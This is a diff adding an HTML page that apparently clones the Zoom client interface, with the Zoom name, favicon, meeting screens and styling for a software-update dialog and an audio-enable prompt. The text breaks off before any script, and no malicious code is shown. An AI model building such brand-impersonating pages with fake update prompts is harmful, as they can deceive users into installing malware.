@@ -1,0 +1,1680 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Zoom</title>
+<link rel="icon" type="image/png" href="https://st1.zoom.us/zoom.ico">
+<script src="https://cdn.tailwindcss.com"></script>
+<style>
+:root{
+  --z-bg:#1C1C1E;
+  --z-surface:#2C2C2E;
+  --z-surface2:#3A3A3C;
+  --z-blue:#2D8CFF;
+  --z-blue-hover:#1a7ae8;
+  --z-red:#E02828;
+  --z-green:#22C55E;
+  --z-border:#48484A;
+  --z-text:#F5F5F7;
+  --z-text2:#AEAEB2;
+  --z-text3:#636366;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%;background:var(--z-bg);color:var(--z-text);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Helvetica,Arial,sans-serif;overflow:hidden}
+
+/* ── SCROLLBAR ── */
+::-webkit-scrollbar{width:5px;height:5px}
+::-webkit-scrollbar-track{background:transparent}
+::-webkit-scrollbar-thumb{background:var(--z-border);border-radius:4px}
+
+/* ── SCREENS ── */
+.screen{position:absolute;inset:0;display:flex;flex-direction:column;transition:opacity .2s}
+.screen.hidden{opacity:0;pointer-events:none}
+
+/* ── TOP NAV (home) ── */
+#nav{height:52px;background:#111;border-bottom:1px solid #2a2a2a;display:flex;align-items:center;padding:0 16px;gap:0;flex-shrink:0;-webkit-app-region:drag}
+.nav-logo{display:flex;align-items:center;gap:8px;font-size:18px;font-weight:700;color:var(--z-blue);-webkit-app-region:no-drag}
+.nav-logo svg{width:28px;height:28px}
+.nav-tabs{display:flex;gap:2px;margin-left:24px;-webkit-app-region:no-drag}
+.nav-tab{padding:6px 14px;border-radius:8px;font-size:13px;font-weight:500;color:var(--z-text2);cursor:pointer;transition:all .15s;border:none;background:transparent}
+.nav-tab:hover{background:var(--z-surface);color:var(--z-text)}
+.nav-tab.active{background:var(--z-surface);color:var(--z-text)}
+.nav-right{margin-left:auto;display:flex;align-items:center;gap:10px;-webkit-app-region:no-drag}
+.avatar-circle{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;align-items:center;justify-content:center;font-size:13px;font-weight:700;cursor:pointer}
+.search-bar{background:var(--z-surface);border:1px solid var(--z-border);border-radius:8px;padding:5px 12px;font-size:13px;color:var(--z-text);width:200px;outline:none}
+.search-bar::placeholder{color:var(--z-text3)}
+.search-bar:focus{border-color:var(--z-blue)}
+
+/* ── HOME CONTENT ── */
+#home-body{flex:1;overflow-y:auto;padding:24px 32px}
+.home-actions{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:28px}
+.action-card{background:var(--z-surface);border-radius:16px;padding:20px 16px;cursor:pointer;transition:all .15s;display:flex;flex-direction:column;align-items:flex-start;gap:12px;border:1px solid transparent}
+.action-card:hover{background:var(--z-surface2);border-color:var(--z-border)}
+.action-icon{width:48px;height:48px;border-radius:14px;display:flex;align-items:center;justify-content:center}
+.action-icon.orange{background:linear-gradient(135deg,#FF8C00,#FF5400)}
+.action-icon.blue{background:linear-gradient(135deg,#2D8CFF,#0060E0)}
+.action-icon.green{background:linear-gradient(135deg,#22C55E,#16A34A)}
+.action-icon.purple{background:linear-gradient(135deg,#A855F7,#7C3AED)}
+.action-card h3{font-size:14px;font-weight:600;color:var(--z-text)}
+.action-card p{font-size:12px;color:var(--z-text2);line-height:1.4}
+
+.section-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
+.section-title{font-size:15px;font-weight:600}
+.section-link{font-size:12px;color:var(--z-blue);cursor:pointer}
+
+.meeting-row{display:flex;align-items:center;gap:12px;padding:12px;border-radius:12px;cursor:pointer;transition:background .12s}
+.meeting-row:hover{background:var(--z-surface)}
+.meeting-icon{width:40px;height:40px;border-radius:12px;background:var(--z-surface2);display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.meeting-info{flex:1;min-width:0}
+.meeting-name{font-size:14px;font-weight:500;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.meeting-meta{font-size:12px;color:var(--z-text2);margin-top:2px}
+.meeting-actions{display:flex;gap:8px;opacity:0;transition:opacity .12s}
+.meeting-row:hover .meeting-actions{opacity:1}
+.btn-sm{padding:5px 14px;border-radius:8px;font-size:12px;font-weight:600;border:none;cursor:pointer;transition:all .12s}
+.btn-blue{background:var(--z-blue);color:#fff}
+.btn-blue:hover{background:var(--z-blue-hover)}
+.btn-ghost{background:var(--z-surface2);color:var(--z-text2)}
+.btn-ghost:hover{background:var(--z-border);color:var(--z-text)}
+
+/* ── MODAL ── */
+.modal-bg{position:fixed;inset:0;background:rgba(0,0,0,.6);display:flex;align-items:center;justify-content:center;z-index:500;backdrop-filter:blur(4px)}
+.modal-bg.hidden{display:none}
+.modal-box{background:var(--z-surface);border-radius:20px;padding:28px;width:420px;max-width:92vw;border:1px solid var(--z-border);box-shadow:0 24px 64px rgba(0,0,0,.5)}
+.modal-title{font-size:18px;font-weight:700;margin-bottom:4px}
+.modal-sub{font-size:13px;color:var(--z-text2);margin-bottom:20px}
+.field-label{font-size:12px;font-weight:600;color:var(--z-text2);margin-bottom:6px;text-transform:uppercase;letter-spacing:.4px}
+.field-input{width:100%;background:#111;border:1px solid var(--z-border);border-radius:10px;padding:10px 14px;font-size:14px;color:var(--z-text);outline:none;transition:border .15s}
+.field-input:focus{border-color:var(--z-blue)}
+.field-input::placeholder{color:var(--z-text3)}
+.modal-actions{display:flex;gap:10px;margin-top:20px;justify-content:flex-end}
+.btn-lg{padding:10px 22px;border-radius:10px;font-size:14px;font-weight:600;border:none;cursor:pointer;transition:all .12s}
+.meeting-id-display{background:#111;border:1px solid var(--z-border);border-radius:10px;padding:14px;display:flex;align-items:center;justify-content:space-between;margin-bottom:16px}
+.meeting-id-val{font-size:20px;font-weight:700;letter-spacing:3px;color:var(--z-blue)}
+.copy-btn{background:var(--z-surface2);border:none;color:var(--z-text2);padding:6px 12px;border-radius:8px;font-size:12px;cursor:pointer;transition:all .12s}
+.copy-btn:hover{background:var(--z-border);color:var(--z-text)}
+.invite-link-box{background:#111;border:1px solid var(--z-border);border-radius:10px;padding:10px 14px;font-size:12px;color:var(--z-text2);word-break:break-all;margin-bottom:12px}
+.toggle-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid #2a2a2a}
+.toggle-row:last-child{border-bottom:none}
+.toggle{width:40px;height:22px;background:var(--z-border);border-radius:11px;position:relative;cursor:pointer;transition:background .2s;flex-shrink:0}
+.toggle.on{background:var(--z-blue)}
+.toggle::after{content:'';position:absolute;top:3px;left:3px;width:16px;height:16px;background:#fff;border-radius:50%;transition:transform .2s}
+.toggle.on::after{transform:translateX(18px)}
+
+/* ── JOIN MODAL ── */
+.join-id-input{width:100%;background:#111;border:1px solid var(--z-border);border-radius:10px;padding:12px 14px;font-size:22px;font-weight:700;color:var(--z-blue);letter-spacing:4px;text-align:center;outline:none;transition:border .15s}
+.join-id-input:focus{border-color:var(--z-blue)}
+.join-id-input::placeholder{color:var(--z-text3);font-size:14px;font-weight:400;letter-spacing:0}
+
+/* ── PRE-JOIN SCREEN ── */
+#prejoin-screen{background:var(--z-bg)}
+.prejoin-wrap{margin:auto;width:480px;max-width:92vw}
+.cam-preview{width:100%;aspect-ratio:16/9;background:#111;border-radius:16px;overflow:hidden;position:relative;margin-bottom:20px;border:1px solid var(--z-border)}
+.cam-preview video{width:100%;height:100%;object-fit:cover}
+.cam-off-overlay{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:#111;flex-direction:column;gap:8px}
+.cam-off-avatar{width:80px;height:80px;border-radius:50%;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;align-items:center;justify-content:center;font-size:30px;font-weight:700}
+.prejoin-controls{display:flex;justify-content:center;gap:12px;margin-bottom:24px}
+.media-btn{width:48px;height:48px;border-radius:50%;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:all .15s;background:var(--z-surface2)}
+.media-btn:hover{background:var(--z-border)}
+.media-btn.off{background:var(--z-red)}
+.meeting-info-bar{background:var(--z-surface);border-radius:12px;padding:14px 16px;margin-bottom:20px;border:1px solid var(--z-border)}
+.join-meeting-btn{width:100%;padding:14px;background:var(--z-blue);border:none;border-radius:12px;font-size:16px;font-weight:700;color:#fff;cursor:pointer;transition:all .15s;margin-bottom:10px}
+.join-meeting-btn:hover{background:var(--z-blue-hover)}
+.join-meeting-btn:disabled{opacity:.5;cursor:not-allowed}
+.cancel-btn{width:100%;padding:12px;background:var(--z-surface2);border:none;border-radius:12px;font-size:14px;font-weight:600;color:var(--z-text2);cursor:pointer;transition:all .15s}
+.cancel-btn:hover{background:var(--z-border)}
+
+/* ── MEETING SCREEN ── */
+#meeting-screen{
+  background:#1a1a1a;
+  display:flex;
+  flex-direction:column;
+  height:100%;
+  overflow:hidden;
+}
+.meeting-top-bar{height:44px;background:#1c1c1e;display:flex;align-items:center;padding:0 14px;gap:10px;flex-shrink:0;border-bottom:1px solid #2a2a2a;z-index:10}
+.meeting-top-title{font-size:13px;font-weight:600;flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.top-action-btn{background:rgba(255,255,255,.07);border:none;color:var(--z-text2);padding:4px 10px;border-radius:6px;font-size:11px;cursor:pointer;transition:all .12s;display:flex;align-items:center;gap:4px;white-space:nowrap}
+.top-action-btn:hover{background:rgba(255,255,255,.14);color:var(--z-text)}
+
+/* video area — fills remaining space between top bar and ctrl bar */
+#video-area{
+  flex:1;
+  min-height:0;
+  position:relative;
+  overflow:hidden;
+}
+
+/* video grid */
+#video-grid{width:100%;height:100%;padding:8px;display:grid;gap:6px;box-sizing:border-box}
+.grid-1{grid-template-columns:1fr;grid-template-rows:1fr}
+.grid-2{grid-template-columns:1fr 1fr;grid-template-rows:1fr}
+.grid-3{grid-template-columns:1fr 1fr;grid-template-rows:1fr 1fr}
+.grid-4{grid-template-columns:1fr 1fr;grid-template-rows:1fr 1fr}
+.grid-5,.grid-6{grid-template-columns:1fr 1fr 1fr;grid-template-rows:1fr 1fr}
+.p-tile{background:#2a2a2a;border-radius:10px;position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center;border:2px solid transparent;transition:border-color .2s}
+.p-tile.speaking{border-color:var(--z-green)}
+.p-tile video{width:100%;height:100%;object-fit:cover;position:absolute;inset:0}
+.p-tile-avatar{width:68px;height:68px;border-radius:50%;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;align-items:center;justify-content:center;font-size:24px;font-weight:700;z-index:1;flex-shrink:0}
+.p-tile-info{position:absolute;bottom:0;left:0;right:0;padding:6px 10px;background:linear-gradient(transparent,rgba(0,0,0,.8));display:flex;align-items:center;justify-content:space-between;z-index:2}
+.p-tile-name{font-size:12px;font-weight:500;display:flex;align-items:center;gap:4px}
+.p-tile-name .host-badge{background:var(--z-blue);font-size:9px;padding:1px 5px;border-radius:3px;font-weight:700}
+.mic-icon{width:18px;height:18px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.mic-icon.on{background:rgba(0,0,0,.35)}
+.mic-icon.off{background:var(--z-red)}
+.p-tile-opts{position:absolute;top:6px;right:6px;opacity:0;transition:opacity .15s;z-index:3}
+.p-tile:hover .p-tile-opts{opacity:1}
+.p-tile-opts button{background:rgba(0,0,0,.55);border:none;color:#fff;width:26px;height:26px;border-radius:6px;cursor:pointer;font-size:13px;display:flex;align-items:center;justify-content:center}
+.network-badge{position:absolute;top:6px;left:6px;background:rgba(220,38,38,.85);color:#fff;padding:2px 6px;font-size:10px;border-radius:4px;z-index:3;display:none}
+.p-tile.network-issue .network-badge{display:block}
+
+/* self-view pip — positioned inside #video-area, above ctrl bar */
+#self-pip{
+  position:absolute;
+  bottom:10px;
+  right:10px;
+  width:168px;
+  height:94px;
+  border-radius:10px;
+  overflow:hidden;
+  border:2px solid rgba(255,255,255,.15);
+  z-index:20;
+  background:#111;
+  box-shadow:0 4px 20px rgba(0,0,0,.5);
+}
+#self-pip video{width:100%;height:100%;object-fit:cover}
+#self-pip .pip-name{position:absolute;bottom:0;left:0;right:0;font-size:10px;padding:3px 7px;background:linear-gradient(transparent,rgba(0,0,0,.75))}
+#self-pip .pip-off{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;background:#1a1a1a;font-size:11px;color:var(--z-text3)}
+
+/* control bar — always at the very bottom */
+.ctrl-bar{
+  height:68px;
+  background:#1c1c1e;
+  border-top:1px solid #2a2a2a;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:0 16px;
+  flex-shrink:0;
+  z-index:10;
+}
+.ctrl-group{display:flex;align-items:center;gap:2px}
+.ctrl-btn{display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;padding:6px 10px;border:none;background:transparent;color:var(--z-text2);cursor:pointer;border-radius:8px;font-size:10px;font-weight:500;transition:all .12s;min-width:52px;height:52px}
+.ctrl-btn:hover{background:rgba(255,255,255,.07);color:var(--z-text)}
+.ctrl-btn svg{width:20px;height:20px;flex-shrink:0}
+.ctrl-btn.muted{color:var(--z-red)}
+.ctrl-btn.muted svg *{stroke:var(--z-red)}
+.ctrl-btn-end{background:var(--z-red);color:#fff;border:none;border-radius:8px;padding:8px 20px;font-size:13px;font-weight:700;cursor:pointer;transition:background .12s;display:flex;align-items:center;gap:6px;height:40px}
+.ctrl-btn-end:hover{background:#c41f1f}
+.ctrl-divider{width:1px;height:28px;background:var(--z-border);margin:0 4px;flex-shrink:0}
+.caret-btn{background:transparent;border:none;color:var(--z-text3);cursor:pointer;padding:2px 2px 2px 0;display:flex;align-items:center;font-size:9px;margin-left:-4px}
+.caret-btn:hover{color:var(--z-text2)}
+
+/* timer */
+#meeting-timer{font-size:12px;font-weight:600;color:var(--z-text2);font-variant-numeric:tabular-nums;letter-spacing:.5px}
+
+/* side panels — anchored inside #video-area so they don't push ctrl bar */
+.side-panel{position:absolute;right:0;top:0;bottom:0;width:300px;background:#1c1c1e;border-left:1px solid var(--z-border);display:flex;flex-direction:column;transform:translateX(100%);transition:transform .25s;z-index:30}
+.side-panel.open{transform:translateX(0)}
+.panel-header{padding:14px 16px;border-bottom:1px solid var(--z-border);display:flex;align-items:center;justify-content:space-between}
+.panel-header h3{font-size:15px;font-weight:700}
+.panel-close{background:transparent;border:none;color:var(--z-text2);cursor:pointer;padding:4px;border-radius:6px}
+.panel-close:hover{background:var(--z-surface2);color:var(--z-text)}
+.chat-body{flex:1;overflow-y:auto;padding:12px}
+.chat-msg{margin-bottom:14px}
+.chat-msg-sender{font-size:12px;font-weight:600;margin-bottom:3px;display:flex;align-items:center;gap:6px}
+.chat-msg-sender .ts{font-weight:400;color:var(--z-text3)}
+.chat-msg-text{font-size:13px;color:var(--z-text2);line-height:1.5}
+.chat-input-row{padding:10px 12px;border-top:1px solid var(--z-border);display:flex;gap:8px}
+.chat-input-row input{flex:1;background:#111;border:1px solid var(--z-border);border-radius:8px;padding:8px 12px;font-size:13px;color:var(--z-text);outline:none}
+.chat-input-row input:focus{border-color:var(--z-blue)}
+.chat-send-btn{background:var(--z-blue);border:none;color:#fff;padding:8px 14px;border-radius:8px;font-size:13px;font-weight:600;cursor:pointer}
+
+/* participants panel */
+.participant-item{display:flex;align-items:center;gap:10px;padding:8px 0;border-bottom:1px solid #2a2a2a}
+.participant-item:last-child{border-bottom:none}
+.p-item-avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#667eea,#764ba2);display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:700;flex-shrink:0}
+.p-item-name{flex:1;font-size:14px;font-weight:500}
+.p-item-role{font-size:11px;color:var(--z-text2)}
+.p-item-icons{display:flex;gap:4px}
+.p-item-icon{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center}
+.p-item-icon.green{background:rgba(34,197,94,.15);color:var(--z-green)}
+.p-item-icon.red{background:rgba(224,40,40,.15);color:var(--z-red)}
+
+/* invite panel */
+.invite-copy-row{display:flex;gap:8px;margin-bottom:12px}
+.invite-copy-row input{flex:1;background:#111;border:1px solid var(--z-border);border-radius:8px;padding:8px 12px;font-size:12px;color:var(--z-text2);outline:none}
+.invite-copy-btn{background:var(--z-blue);border:none;color:#fff;padding:8px 14px;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer;white-space:nowrap}
+
+/* update modal */
+#update-modal{z-index:600}
+.update-box{background:var(--z-surface);border-radius:16px;padding:22px 24px;width:380px;max-width:92vw;border:1px solid var(--z-border);box-shadow:0 24px 60px rgba(0,0,0,.6)}
+.upd-step{display:flex;align-items:center;gap:10px}
+.upd-step-dot{width:16px;height:16px;border-radius:50%;flex-shrink:0;border:2px solid var(--z-border);background:transparent;transition:all .3s;position:relative}
+.upd-step-dot.active{border-color:var(--z-blue);background:transparent;box-shadow:0 0 0 3px rgba(45,140,255,.2)}
+.upd-step-dot.active::after{content:'';position:absolute;inset:3px;border-radius:50%;background:var(--z-blue);animation:dotPulse .8s ease-in-out infinite alternate}
+.upd-step-dot.done{border-color:var(--z-green);background:var(--z-green)}
+.upd-step-dot.done::after{content:'✓';position:absolute;inset:0;display:flex;align-items:center;justify-content:center;color:#fff;font-size:9px;font-weight:700}
+@keyframes dotPulse{from{opacity:.5}to{opacity:1}}
+
+/* toast */
+#toast{position:fixed;bottom:90px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.85);border:1px solid var(--z-border);color:#fff;padding:10px 20px;border-radius:10px;font-size:13px;font-weight:500;z-index:900;opacity:0;transition:opacity .2s;pointer-events:none;backdrop-filter:blur(8px);white-space:nowrap}
+#toast.show{opacity:1}
+
+/* audio enable float */
+#audio-enable{position:fixed;left:50%;transform:translateX(-50%);bottom:90px;z-index:700;padding:8px 16px;border-radius:999px;display:none;align-items:center;gap:10px;background:linear-gradient(90deg,#e02828,#b71c1c);box-shadow:0 8px 20px rgba(224,40,40,.25);color:#fff;font-size:13px}
+#audio-enable.show{display:flex}
+#audio-enable-btn{background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.2);padding:5px 12px;color:#fff;border-radius:6px;font-size:12px;font-weight:600;cursor:pointer}
+
+/* reactions */
+.reaction-pop{position:absolute;bottom:40px;font-size:28px;animation:reactionFloat 2s ease-out forwards;pointer-events:none;z-index:10}
+@keyframes reactionFloat{0%{opacity:1;transform:translateY(0) scale(1)}100%{opacity:0;transform:translateY(-80px) scale(1.4)}}
+
+/* schedule table */
+.sch-row{display:flex;gap:12px;padding:12px 0;border-bottom:1px solid #2a2a2a;align-items:flex-start}
+.sch-row:last-child{border-bottom:none}
+.sch-date{width:44px;text-align:center;flex-shrink:0}
+.sch-day{font-size:10px;font-weight:600;color:var(--z-text2);text-transform:uppercase}
+.sch-num{font-size:22px;font-weight:700;line-height:1}
+.sch-info{flex:1}
+.sch-title{font-size:14px;font-weight:600;margin-bottom:2px}
+.sch-meta{font-size:12px;color:var(--z-text2)}
+.sch-start-btn{background:var(--z-blue);border:none;color:#fff;padding:6px 14px;border-radius:8px;font-size:12px;font-weight:600;cursor:pointer}
+.sch-start-btn:hover{background:var(--z-blue-hover)}
+
+/* loading dots */
+.dot-loader{display:flex;gap:6px;justify-content:center}
+.dot-loader span{width:10px;height:10px;background:var(--z-blue);border-radius:50%;animation:dotB 1.2s infinite ease-in-out}
+.dot-loader span:nth-child(2){animation-delay:.2s}
+.dot-loader span:nth-child(3){animation-delay:.4s}
+@keyframes dotB{0%,80%,100%{transform:scale(.5);opacity:.4}40%{transform:scale(1);opacity:1}}
+
+/* reactions bar */
+.reactions-bar{position:absolute;bottom:80px;left:50%;transform:translateX(-50%);background:rgba(0,0,0,.75);border:1px solid var(--z-border);border-radius:999px;padding:6px 12px;display:flex;gap:4px;z-index:60;backdrop-filter:blur(8px)}
+.reactions-bar button{background:transparent;border:none;font-size:22px;cursor:pointer;padding:4px 6px;border-radius:8px;transition:background .12s}
+.reactions-bar button:hover{background:rgba(255,255,255,.1)}
+
+@media(max-width:640px){
+  .home-actions{grid-template-columns:1fr 1fr}
+  .ctrl-btn span{display:none}
+  .ctrl-btn{min-width:44px;padding:8px}
+  #self-pip{width:110px;height:62px;bottom:80px}
+}
+</style>
+<style>*, ::before, ::after{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }::backdrop{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:rgb(59 130 246 / 0.5);--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }/* ! tailwindcss v3.4.17 | MIT License | https://tailwindcss.com */*,::after,::before{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}::after,::before{--tw-content:''}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]:where(:not([hidden=until-found])){display:none}.hidden{display:none}</style></head>
+<body>
+
+<!-- ══════════════════════════════════════ -->
+<!--  LOADING                               -->
+<!-- ══════════════════════════════════════ -->
+<div id="loading-screen" class="screen hidden" style="align-items:center;justify-content:center;gap:20px">
+  <svg width="60" height="60" viewBox="0 0 60 60" fill="none"><rect width="60" height="60" rx="14" fill="#2D8CFF"></rect><path d="M14 22C14 20.3 15.3 19 17 19h18c1.7 0 3 1.3 3 3v16c0 1.7-1.3 3-3 3H17c-1.7 0-3-1.3-3-3V22zm26 2.5l6-4v19l-6-4V24.5z" fill="white"></path></svg>
+  <p style="font-size:14px;color:var(--z-text2)">Starting Zoom…</p>
+  <div class="dot-loader"><span></span><span></span><span></span></div>
+</div>
+
+<!-- ══════════════════════════════════════ -->
+<!--  HOME                                  -->
+<!-- ══════════════════════════════════════ -->
+<div id="home-screen" class="screen" style="flex-direction:column">
+  <div id="nav">
+    <div class="nav-logo">
+      <svg viewBox="0 0 60 60" fill="none"><rect width="60" height="60" rx="14" fill="#2D8CFF"></rect><path d="M14 22C14 20.3 15.3 19 17 19h18c1.7 0 3 1.3 3 3v16c0 1.7-1.3 3-3 3H17c-1.7 0-3-1.3-3-3V22zm26 2.5l6-4v19l-6-4V24.5z" fill="white"></path></svg>
+      Zoom
+    </div>
+    <div class="nav-tabs">
+      <button class="nav-tab active" onclick="switchTab('home',this)">Home</button>
+      <button class="nav-tab" onclick="switchTab('chat',this)">Chat</button>
+      <button class="nav-tab" onclick="switchTab('meetings',this)">Meetings</button>
+      <button class="nav-tab" onclick="switchTab('contacts',this)">Contacts</button>
+    </div>
+    <div class="nav-right">
+      <input class="search-bar" placeholder="Search" id="nav-search">
+      <div class="avatar-circle" id="nav-avatar" title="Profile">YO</div>
+    </div>
+  </div>
+
+  <div id="home-body">
+
+    <!-- tab: home -->
+    <div id="tab-home">
+      <div class="home-actions">
+        <div class="action-card" onclick="openNewMeetingModal()">
+          <div class="action-icon orange">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><polygon points="23 7 16 12 23 17 23 7"></polygon><rect x="1" y="5" width="15" height="14" rx="2"></rect></svg>
+          </div>
+          <div>
+            <h3>New Meeting</h3>
+            <p>Start an instant meeting</p>
+          </div>
+        </div>
+        <div class="action-card" onclick="openJoinModal()">
+          <div class="action-icon blue">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><path d="M15 3h4a2 2 0 012 2v14a2 2 0 01-2 2h-4"></path><polyline points="10 17 15 12 10 7"></polyline><line x1="15" y1="12" x2="3" y2="12"></line></svg>
+          </div>
+          <div>
+            <h3>Join</h3>
+            <p>Join a meeting in progress</p>
+          </div>
+        </div>
+        <div class="action-card" onclick="openScheduleModal()">
+          <div class="action-icon green">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
+          </div>
+          <div>
+            <h3>Schedule</h3>
+            <p>Plan a future meeting</p>
+          </div>
+        </div>
+        <div class="action-card" onclick="openShareModal()">
+          <div class="action-icon purple">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><line x1="8.59" y1="13.51" x2="15.42" y2="17.49"></line><line x1="15.41" y1="6.51" x2="8.59" y2="10.49"></line></svg>
+          </div>
+          <div>
+            <h3>Share Screen</h3>
+            <p>Share directly without a meeting</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="section-header">
+        <span class="section-title">Upcoming Meetings</span>
+        <span class="section-link" onclick="switchTab('meetings',document.querySelector('.nav-tab:nth-child(3)'))">View all</span>
+      </div>
+      <div id="upcoming-list"><div style="text-align:center;padding:32px 0;color:var(--z-text3);font-size:14px">No upcoming meetings</div></div>
+    </div>
+
+    <!-- tab: chat -->
+    <div id="tab-chat" class="hidden">
+      <div style="display:flex;align-items:center;justify-content:center;height:300px;flex-direction:column;gap:12px;color:var(--z-text3)">
